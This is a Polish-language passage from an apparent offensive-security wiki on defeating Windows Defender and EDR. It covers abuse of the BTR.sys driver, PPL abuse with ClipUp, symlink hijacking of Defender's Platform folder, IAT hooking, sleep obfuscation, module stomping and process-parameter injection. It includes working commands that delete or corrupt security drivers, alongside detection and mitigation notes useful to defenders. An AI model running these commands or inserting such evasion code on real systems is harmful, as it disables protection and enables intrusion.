[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementuje kompletny łańcuch: wyodrębnia `BTR.sys` z lokalnego Defendera, tworzy `<random>.sys:changelist` oraz strumień feedbacku, serializuje, oblicza sumy kontrolne i szyfruje połączone akcje, bezpośrednio tworzy klucz rejestru usługi, a następnie wywołuje `NtLoadDriver` dla `-trigger now` lub pozostawia sterownik jako uruchamiany podczas startu systemu dla `-trigger boot`. Bezpośrednie przygotowanie rejestru omija standardową ścieżkę SCM `CreateServiceW`, dlatego **nie powoduje wygenerowania zdarzenia instalacji usługi o identyfikatorze 7045**. Artefakty uruchamiane podczas rozruchu można później usunąć za pomocą `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` nie jest użyteczne, ponieważ BTR wykonuje operacje I/O na plikach z poziomu `DriverEntry`, zanim stos pamięci masowej i link `SystemRoot` będą gotowe. `Start=1` wraz z grupą `Boot Bus Extender` o wysokim priorytecie powoduje wykonanie w Phase 1: NTFS jest już dostępny, ale wiele sterowników zabezpieczeń uruchamianych wraz z systemem oraz usług EDR działających w trybie user-mode nie zostało jeszcze zainicjalizowanych. Filtry uruchamiane podczas bootowania, takie jak `WdFilter`, mogą być już załadowane, jednak BTR może usunąć ich pliki binarne lub konfigurację usług przed kolejnym uruchomieniem, a także usunąć pliki wykonywalne usług, zanim SCM je uruchomi. ELAM nie zamyka tej luki, ponieważ BTR działa po ocenie sterowników uruchamianych podczas bootowania i ma prawidłowy podpis Microsoft.<sup>[[36]](#references)</sup>

Wiele działań jest wykonywanych w ramach jednej transakcji. PoC umieszcza jako pierwszą Action 1 dla hard-coded `\SystemRoot\Temp\BootClean.log`: BTR tworzy ten log, następnie realizuje własne żądanie usunięcia i usuwa go przed wyładowaniem. Ogranicza to ilość dowodów, natomiast umieszczenie informacji zwrotnej w `<random>.sys:<random>.dat` pozwala usunąć sterownik oraz oba strumienie jednocześnie.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacje o wysokiej wartości sygnału

Reguły oparte wyłącznie na podpisach oraz lista blokowanych podatnych sterowników Microsoft nie rozwiązują problemu nadużywania zamierzonych funkcji BTR. Preferuj poniższe korelacje behawioralne, odróżniając jednocześnie prawidłowe pochodzenie Defendera od dowolnego launchera.<sup>[[36]](#references)</sup>

- **Sysmon 15:** tworzenie `.sys:changelist` jest uniwersalne dla stagingu BTR. Szczególnie podejrzany jest ADS `.dat` dołączony do tego samego `.sys`, ponieważ legalny Defender zwykle umieszcza informacje zwrotne w `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** koreluj bezpośrednie utworzenie `HKLM\SYSTEM\CurrentControlSet\Services\<random>` zawierającego `Args=...:changelist` oraz `Group=Boot Bus Extender` z brakiem odpowiadającego zdarzenia instalacji SCM.
- **Sysmon 6 -> 23:** koreluj znane załadowanie sterownika BTR pochodzącego spoza Defendera z późniejszym usunięciem pliku przypisanym do `System`/PID 4, szczególnie w przypadku plików binarnych związanych z bezpieczeństwem.
- **Sysmon 11 -> 23:** generuj alert przy szybkim utworzeniu i usunięciu `\SystemRoot\Temp\BootClean.log` przez `System`/PID 4.
- Ogranicz i audytuj przypisywanie/włączanie `SeLoadDriverPrivilege`; sam podpis Microsoft nie zapewnia wystarczającego poziomu zaufania, gdy sterownik narzędzia bezpieczeństwa jest umieszczany przez `cmd.exe`, PowerShell lub nieznany proces.

## Nadużywanie Protected Process Light (PPL) do manipulowania AV/EDR za pomocą LOLBINs

Protected Process Light (PPL) wymusza hierarchię signer/level, dzięki czemu tylko chronione procesy o równym lub wyższym poziomie mogą manipulować sobą nawzajem. Z perspektywy ofensywnej, jeśli można legalnie uruchomić binary z obsługą PPL i kontrolować jego argumenty, można przekształcić łagodną funkcjonalność (np. logowanie) w ograniczony, wspierany przez PPL prymityw zapisu w chronionych katalogach używanych przez AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Co powoduje uruchomienie procesu jako PPL
- Docelowy EXE (oraz wszystkie załadowane DLL) musi być podpisany za pomocą EKU obsługującego PPL.
- Proces musi zostać utworzony za pomocą CreateProcess z użyciem flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego poziomu ochrony odpowiadającego signerowi binary (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla signerów anti-malware, `PROTECTION_LEVEL_WINDOWS` dla signerów Windows). Nieprawidłowe poziomy spowodują niepowodzenie podczas tworzenia procesu.

Zobacz także szersze wprowadzenie do PP/PPL oraz ochrony LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia launchera
- Open-source helper: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Wzorzec użycia:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Podpisany systemowy binary `C:\Windows\System32\ClipUp.exe` uruchamia się samodzielnie i akceptuje parametr pozwalający zapisać plik logu w ścieżce wskazanej przez wywołującego.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z uprawnieniami PPL.
- ClipUp nie potrafi analizować ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać normalnie chronione lokalizacje.

8.3 short path helpers
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Wyznacz krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z `CREATE_PROTECTED_PROCESS`, używając launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj krótkich nazw 8.3.
3) Jeśli docelowy binary jest zwykle otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas bootowania, przed uruchomieniem AV, instalując usługę auto-start, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność bootowania za pomocą Process Monitor (boot logging).
4) Po ponownym uruchomieniu zapis obsługiwany przez PPL nastąpi, zanim AV zablokuje swoje binary, uszkadzając docelowy plik i uniemożliwiając uruchomienie.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie można kontrolować zawartości zapisywanej przez ClipUp, a jedynie jej lokalizację; primitive nadaje się do corruption, a nie do precyzyjnego wstrzykiwania treści.
- Wymaga lokalnych uprawnień administratora/SYSTEM do zainstalowania/uruchomienia usługi oraz okna czasowego na reboot.
- Kluczowe znaczenie ma timing: element docelowy nie może być otwarty; wykonanie podczas boot pozwala uniknąć blokad plików.

Detections
- Tworzenie procesu `ClipUp.exe` z nietypowymi argumentami, szczególnie gdy jego parentem są niestandardowe launchery, w pobliżu boot.
- Nowe usługi skonfigurowane do auto-startu podejrzanych plików binarnych i konsekwentnie uruchamiające się przed Defender/AV. Należy zbadać tworzenie/modyfikację usług przed wystąpieniem błędów uruchamiania Defendera.
- Monitorowanie integralności plików binarnych Defendera i katalogów Platform; nieoczekiwane tworzenie/modyfikacje plików przez procesy z flagami protected-process.
- Telemetria ETW/EDR: należy szukać procesów tworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalnego użycia poziomu PPL przez pliki binarne inne niż AV.

Mitigations
- WDAC/Code Integrity: ograniczyć, które podpisane pliki binarne mogą działać jako PPL oraz z jakimi parentami; blokować uruchamianie ClipUp poza uzasadnionymi kontekstami.
- Higiena usług: ograniczyć tworzenie/modyfikację usług auto-start i monitorować manipulowanie kolejnością uruchamiania.
- Upewnić się, że ochrona przed manipulacją Defendera i zabezpieczenia early-launch są włączone; badać błędy uruchamiania wskazujące na corruption pliku binarnego.
- Rozważyć wyłączenie generowania krótkich nazw 8.3 na woluminach zawierających security tooling, jeśli jest to zgodne ze środowiskiem (dokładnie przetestować).

## Manipulowanie Microsoft Defender poprzez przejęcie symlinka folderu wersji Platform

Windows Defender wybiera platformę, z której działa, wyliczając podfoldery w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznie ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia stamtąd procesy usługi Defendera (odpowiednio aktualizując ścieżki usługi/rejestru). Ta selekcja ufa wpisom katalogu, w tym directory reparse points (symlinkom). Administrator może wykorzystać to do przekierowania Defendera do ścieżki zapisywalnej przez attackera i uzyskania DLL sideloading lub zakłócenia działania usługi.<sup>[[21]](#references)[[22]](#references)</sup>

Warunki wstępne
- Local Administrator (potrzebny do tworzenia katalogów/symlinków w folderze Platform)
- Możliwość wykonania rebootu lub wywołania ponownej selekcji platformy Defendera (restart usługi podczas boot)
- Wymagane są wyłącznie wbudowane tools (`mklink`)

Dlaczego to działa
- Defender blokuje zapisy w swoich folderach, ale jego selekcja platformy ufa wpisom katalogu i wybiera leksykograficznie najwyższą wersję bez sprawdzania, czy cel wskazuje na chronioną/zaufaną ścieżkę.

Krok po kroku (przykład)
1) Przygotuj zapisywalną kopię bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz wewnątrz Platform dowiązanie symboliczne katalogu o wyższej wersji wskazujące na Twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór triggera (zalecane ponowne uruchomienie):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, czy MsMpEng.exe (WinDefend) działa ze przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Należy obserwować nową ścieżkę procesu w `C:\TMP\AV\` oraz konfigurację usługi/rejestru wskazującą tę lokalizację.

Opcje post-exploitation
- DLL sideloading/code execution: Upuść/zastąp biblioteki DLL ładowane przez Defender z jego katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz powyższą sekcję: [DLL Sideloading i Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, aby przy następnym uruchomieniu skonfigurowana ścieżka nie mogła zostać rozwiązana, a Defender nie uruchomił się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Należy pamiętać, że ta technika sama w sobie nie zapewnia privilege escalation; wymaga uprawnień administratora.

## IAT Hooking + Call-Stack Spoofing z PIC (w stylu Crystal Kit)

Red teams mogą przenieść runtime evasion z implantu C2 bezpośrednio do modułu docelowego, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego, position-independent code (PIC). Uogólnia to evasion poza niewielki zestaw API udostępniany przez wiele kitów (np. CreateProcessA) i rozszerza te same zabezpieczenia na BOFs oraz post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Podejście wysokiego poziomu
- Umieść blob PIC obok modułu docelowego za pomocą reflective loadera (dołączonego na początku lub jako companion). PIC musi być samowystarczalny i position-independent.
- Gdy host DLL zostanie załadowany, przejdź przez jego IMAGE_IMPORT_DESCRIPTOR i zmień wpisy IAT dla wybranych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na cienkie wrappery PIC.
- Każdy wrapper PIC wykonuje evasion przed wykonaniem tail-call do adresu rzeczywistego API. Typowe techniki evasion obejmują:
- Maskowanie i odmaskowywanie pamięci wokół wywołania (np. szyfrowanie regionów beacon, RWX→RX, zmiana nazw/uprawnień stron), a następnie przywrócenie stanu po wywołaniu.
- Call-stack spoofing: utworzenie zaufanego stosu i przejście do docelowego API tak, aby analiza call stacku wskazywała oczekiwane ramki.<sup>[[9]](#references)</sup>
- Dla zapewnienia kompatybilności wyeksportuj interfejs, aby skrypt Aggressor (lub odpowiednik) mógł rejestrować API do hookowania dla Beacon, BOFs i post-ex DLLs.

Dlaczego w tym przypadku IAT hooking
- Działa dla dowolnego kodu używającego zahookowanego importu, bez modyfikowania kodu narzędzia i bez polegania na Beacon w zakresie proxy dla określonych API.
- Obejmuje post-ex DLLs: hookowanie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować te same techniki masking/stack evasion do ich wywołań API.
- Przywraca niezawodne używanie post-ex commands uruchamiających procesy w środowiskach z detekcją opartą na call stacku poprzez opakowanie CreateProcessA/W.

Minimalny szkic IAT hook (pseudokod x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Uwagi
- Zastosuj patch po relocations/ASLR i przed pierwszym użyciem importu. Reflective loaders, takie jak TitanLdr/AceLdr, demonstrują hooking podczas DllMain załadowanego modułu.
- Utrzymuj wrappers małe i PIC-safe; rozwiązuj prawdziwe API za pomocą oryginalnej wartości IAT przechwyconej przed patchingiem albo przez LdrGetProcedureAddress.
- Stosuj przejścia RW → RX dla PIC i unikaj pozostawiania stron jednocześnie zapisywalnych i wykonywalnych.

Stub call-stack spoofingu
- Stubsy PIC w stylu Draugr budują fałszywy łańcuch wywołań (adresy powrotu wskazujące na benign modules), a następnie przechodzą do prawdziwego API.
- Udaremnia to detekcje oczekujące canonical stacks z Beacon/BOFs do wrażliwych API.
- Połącz to z technikami stack cutting/stack stitching, aby wylądować wewnątrz oczekiwanych frames przed prologiem API.

Integracja operacyjna
- Dodaj reflective loader przed post-ex DLLs, aby PIC i hooks inicjalizowały się automatycznie podczas ładowania DLL.
- Użyj Aggressor script do rejestracji target APIs, dzięki czemu Beacon i BOFs będą transparentnie korzystać z tej samej ścieżki evasion bez zmian w kodzie.

Uwagi dotyczące detekcji/DFIR
- Integralność IAT: entries rozwiązujące się do adresów non-image (heap/anon); okresowa weryfikacja import pointers.
- Anomalie stosu: adresy powrotu nienależące do załadowanych images; nagłe przejścia do non-image PIC; niespójne pochodzenie RtlUserThreadStart.
- Telemetria loadera: zapisy IAT wewnątrz procesu, wczesna aktywność DllMain modyfikująca import thunks, nieoczekiwane regiony RX tworzone podczas load.
- Evasion image-load: jeśli hookingujesz LoadLibrary*, monitoruj podejrzane ładowanie automation/clr assemblies skorelowane ze zdarzeniami memory masking.

Powiązane building blocks i przykłady
- Reflective loaders wykonujące IAT patching podczas load (np. TitanLdr, AceLdr)
- Memory masking hooks (np. simplehook) i stack-cutting PIC (stackcutting)
- Stubsy PIC call-stack spoofingu (np. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks przez rezydentny PICO

Jeśli kontrolujesz reflective loader, możesz hookować imports **podczas** `ProcessImports()`, zastępując pointer loadera do `GetProcAddress` własnym resolverem, który najpierw sprawdza hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Zbuduj **resident PICO** (persistent PIC object), który przetrwa po zwolnieniu transient loader PIC.
- Wyeksportuj funkcję `setup_hooks()`, która nadpisuje import resolver loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj ordinal imports i użyj hash-based hook lookup, takiego jak `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie przekaż wywołanie do prawdziwego `GetProcAddress`.
- Zarejestruj targety hooks w link time za pomocą wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostaje poprawny, ponieważ znajduje się wewnątrz resident PICO.

Zapewnia to **import-time IAT redirection** bez patchowania code section załadowanej DLL po load.

### Wymuszanie hookable imports, gdy target używa PEB-walking

Import-time hooks są uruchamiane tylko wtedy, gdy dana funkcja rzeczywiście znajduje się w IAT targetu. Jeśli moduł rozwiązuje APIs przez PEB-walk + hash (bez import entry), wymuś prawdziwy import, aby ścieżka `ProcessImports()` loadera go zobaczyła:

- Zastąp hashed export resolution (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, takim jak `&WaitForSingleObject`.
- Compiler wygeneruje IAT entry, umożliwiając interception, gdy reflective loader rozwiązuje imports.

### Sleep/idle obfuscation w stylu Ekko bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste wait/IPC primitives**, których używa implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). W przypadku długich waits opakuj wywołanie w obfuscation chain w stylu Ekko, który szyfruje in-memory image podczas idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Użyj `CreateTimerQueueTimer` do zaplanowania sekwencji callbacks wywołujących `NtContinue` z przygotowanymi `CONTEXT` frames.
- Typowy chain (x64): ustaw image na `PAGE_READWRITE` → szyfrowanie RC4 przez `advapi32!SystemFunction032` na całym mapped image → wykonaj blocking wait → deszyfrowanie RC4 → **przywróć per-section permissions**, przechodząc po sekcjach PE → zasygnalizuj completion.
- `RtlCaptureContext` dostarcza template `CONTEXT`; sklonuj go do wielu frames i ustaw registers (`Rip/Rcx/Rdx/R8/R9`), aby wywołać każdy krok.

Szczegół operacyjny: zwracaj „success” dla długich waits (np. `WAIT_OBJECT_0`), aby caller kontynuował działanie, gdy image jest zamaskowany. Ten pattern ukrywa moduł przed scannerami podczas idle windows i unika klasycznej sygnatury „patched `Sleep()`”.

Pomysły na detekcję (oparte na telemetry)
- Bursts callbacks `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- Użycie `advapi32!SystemFunction032` na dużych, ciągłych buffers o rozmiarze image.
- `VirtualProtect` dla dużego zakresu, po którym następuje custom per-section permission restoration.

### Runtime CFG registration dla sleep-obfuscation gadgets

Na targets z włączonym CFG pierwszy indirect jump do mid-function gadget, takiego jak `jmp [rbx]` lub `jmp rdi`, zwykle spowoduje crash procesu z `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadget nie występuje w CFG metadata modułu. Aby utrzymać chains w stylu Ekko/Kraken w hardened processes:<sup>[[30]](#references)</sup>

- Zarejestruj każdy indirect destination używany przez chain za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` oraz entries `CFG_CALL_TARGET_VALID`.
- Dla adresów wewnątrz loaded images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **image base** i obejmować **pełny image size**.
- Dla manually mapped/PIC/stomped regions użyj **allocation base** i zamiast tego allocation size.
- Oznacz nie tylko dispatch gadget, lecz także exports osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) oraz wszystkie attacker-controlled executable sections, które staną się indirect targets.

Zmienia to sleep chains w stylu ROP/JOP z „działa tylko w procesach bez CFG” w reusable primitive dla `explorer.exe`, browsers, `svchost.exe` i innych endpoints skompilowanych z `/guard:cf`.

### CET-safe stack spoofing dla sleeping threads

Pełna zamiana `CONTEXT` jest głośna i może nie działać na systemach z CET Shadow Stack, ponieważ spoofed `Rip` nadal musi być zgodny z hardware shadow stack. Bezpieczniejszy sleep-masking pattern to:<sup>[[30]](#references)</sup>

- Wybierz inny thread w tym samym procesie i odczytaj jego `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) przez `NtQueryInformationThread`.
- Wykonaj backup bieżącego real TEB/TIB.
- Przechwyć real sleeping context za pomocą `GetThreadContext`.
- Skopiuj **wyłącznie realne `Rip`** do spoof context, pozostawiając spoofed `Rsp`/stack state bez zmian.
- Podczas sleep window skopiuj spoof thread's `NT_TIB` do bieżącego TEB, aby stack walkers rozwijali stos wewnątrz legitimate stack range.
- Po zakończeniu wait przywróć oryginalny TIB i thread context.

Zachowuje to CET-consistent instruction pointer, jednocześnie wprowadzając w błąd EDR stack walkers, które ufają TEB stack metadata przy walidacji unwinds.

### Alternatywa oparta na APC: Kraken Mask

Jeśli timer-queue dispatch ma zbyt rozpoznawalną sygnaturę, tę samą sekwencję sleep-encrypt-spoof-restore można wykonać z suspended helper thread za pomocą queued APCs:<sup>[[27]](#references)</sup>

- Utwórz helper thread z `NtTestAlert` jako entrypoint.
- Queue przygotowane `CONTEXT` frames/APCs przez `NtQueueApcThread` i opróżniaj je za pomocą `NtAlertResumeThread`.
- Przechowuj chain state na heap zamiast na helper stack, aby uniknąć wyczerpania domyślnego 64 KB thread stack.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować start event i przejść do block.
- Wstrzymaj main thread przed przywróceniem TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), aby zmniejszyć race window, w którym scanner mógłby przechwycić częściowo przywrócony stack.

Zastępuje to sygnaturę `CreateTimerQueueTimer` + `NtContinue` sygnaturą helper-thread/APC, zachowując te same cele RC4 masking i stack spoofingu.

Dodatkowe pomysły na detekcję
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` krótko przed sleeps, waits lub APC dispatch.
- `GetThreadContext`/`SetThreadContext` opakowane wokół `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread`, po którym następują bezpośrednie zapisy do stack bounds bieżącego thread's TEB/TIB.
- Chains `NtQueueApcThread`/`NtAlertResumeThread`, które pośrednio docierają do `SystemFunction032`, `VirtualProtect` lub helpers przywracających section permissions.
- Powtarzające się użycie krótkich gadget signatures, takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`), jako dispatch pivots wewnątrz signed modules.


## Precision Module Stomping

Module stomping wykonuje payloads z **`.text` section DLL już zmapowanej wewnątrz target process**, zamiast alokować oczywistą private executable memory lub ładować nową sacrificial DLL. Overwrite target powinien być **loaded, disk-backed image**, którego code space może pomieścić payload bez uszkadzania code paths, których proces nadal potrzebuje.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

Naive stomping przeciwko common modules, takim jak `uxtheme.dll` lub `comctl32.dll`, jest fragile: DLL może nie być załadowana w remote process, a zbyt mały code region spowoduje crash procesu. Bardziej reliable workflow wygląda następująco:

1. Wylicz modules target process i zachowaj **names-only include list** już załadowanych DLLs.
2. Najpierw zbuduj payload i zapisz jego **dokładny byte size**.
3. Przeskanuj candidate DLLs na dysku i porównaj PE section **`.text` `Misc_VirtualSize`** z payload size. Ma to większe znaczenie niż file size, ponieważ odzwierciedla rozmiar executable section **po zmapowaniu w memory**.
4. Sparsuj **Export Address Table (EAT)** i wybierz exported function RVA jako stomp start offset.
5. Oblicz **blast radius**: jeśli payload przekracza granicę wybranej funkcji, nadpisze adjacent exports ułożone za nią w memory.

Typowe recon/selection helpers spotykane in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Uwagi operacyjne
- Preferuj DLLs **już załadowane** w zdalnym procesie, aby uniknąć telemetryki `LoadLibrary`/nieoczekiwanych załadowań obrazów.
- Preferuj exports, które są rzadko wykonywane przez aplikację docelową; w przeciwnym razie normalne ścieżki kodu mogą trafić na zmodyfikowane bajty przed utworzeniem wątku lub po nim.
- Duże implanty często wymagają zmiany sposobu osadzania shellcode ze string literal na **byte-array/braced initializer**, aby cały bufor był poprawnie reprezentowany w kodzie injectora.

Pomysły na detekcję
- Zdalne zapisy do **wykonywalnych stron opartych na obrazie** (`MEM_IMAGE`, `PAGE_EXECUTE*`) zamiast częściej spotykanych prywatnych alokacji RWX/RX.
- Punkty wejścia exportów, których bajty w pamięci nie odpowiadają już plikowi źródłowemu na dysku.
- Zdalne wątki lub pivots kontekstu, które rozpoczynają wykonywanie wewnątrz legalnego exportu DLL, którego pierwsze bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` skierowane do stron `.text` DLL, po których następuje utworzenie wątku.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) to technika **process-injection / EDR-evasion**, która omija klasyczną ścieżkę zdalnego zapisu (`VirtualAllocEx` + `WriteProcessMemory`). Zamiast kopiować bajty do już uruchomionego celu, wykorzystuje fakt, że Windows **kopiuje wybrane parametry startowe `CreateProcessW` do procesu potomnego** i przechowuje je w `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nośniki możliwe do zatrucia, kopiowane przez `CreateProcessW`

Przydatne nośniki to:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (z `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktyczne ograniczenia nośników:

- `lpCommandLine` musi wskazywać **zapisywalną pamięć** dla `CreateProcessW` i jest ograniczony do **32 767 znaków Unicode**, wliczając terminator null.
- `lpEnvironment` musi być blokiem środowiska Unicode zawierającym kolejne stringi `NAME=VALUE\0`, zakończonym dodatkowym `\0`.
- `lpReserved` jest oficjalnie zarezerwowany, dlatego mapowanie `ShellInfo` należy traktować jako szczegół implementacyjny, a nie stabilny, udokumentowany kontrakt.

Dzięki temu normalne tworzenie procesu staje się **prymitywem transferu payloadu**. Operator tworzy proces potomny z kontrolowanymi przez attackera danymi startowymi i pozwala Windows wykonać kopiowanie między procesami.

### Przepływ zdalnego wyszukiwania bez zdalnych API zapisu

Po utworzeniu procesu potomnego rozwiąż adres skopiowanego bufora za pomocą prymitywów **tylko do odczytu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pobierz `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Odczytaj zdalny `PEB`
3. Podąż za `PEB.ProcessParameters`
4. Odczytaj `RTL_USER_PROCESS_PARAMETERS`
5. Użyj wybranego wskaźnika:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimalny przepływ:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Wykonywanie skopiowanego bufora parametrów

Skopiowany region parametrów jest zwykle `RW`, a nie wykonywalny. Typowy chain P3 wygląda następująco:

1. Utwórz proces normalnie (bez wstrzymywania)
2. Ustaw wybranej stronie parametrów prawa wykonywania za pomocą `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponownie użyj uchwytu głównego wątku zwróconego w `PROCESS_INFORMATION`
4. Przekieruj wykonywanie za pomocą `NtSetContextThread` (`CONTEXT_CONTROL`, nadpisanie `RIP`)

W przeciwieństwie do klasycznych workflow thread hijacking nie wymaga to `SuspendThread` / `ResumeThread`; context można zmienić bezpośrednio na zwróconym uchwycie głównego wątku.

Pozwala to uniknąć kilku API często monitorowanych pod kątem injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- często także `SuspendThread` / `ResumeThread`

### Ograniczenie null-byte i staged shellcode

Wszystkie trzy carriers to **dane typu string lub zbliżone do stringów**, dlatego surowy payload zawierający `0x00` zostaje obcięty podczas transferu. Praktycznym obejściem jest **null-free first stage**, który odtwarza stałe w runtime, a następnie ładuje dowolny second stage.

Prosty pattern polega na syntezie stałych za pomocą XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Umożliwia to first stage tworzenie stringów stosu, argumentów API, ścieżek DLL lub loadera shellcode second stage bez osadzania bajtów null w transportowanym parametrze.

### Wywołania API oparte na stosie z first stage

Gdy first stage musi wywołać API, takie jak `LoadLibraryA`, może:

- umieścić string/bufor na stosie celu
- zarezerwować **32-bajtowy x64 shadow space**
- ustawić `RCX`, `RDX`, `R8`, `R9` na stałe wartości lub wskaźniki względne względem `RSP`
- zachować **16-bajtowe wyrównanie `RSP`** przed wywołaniem

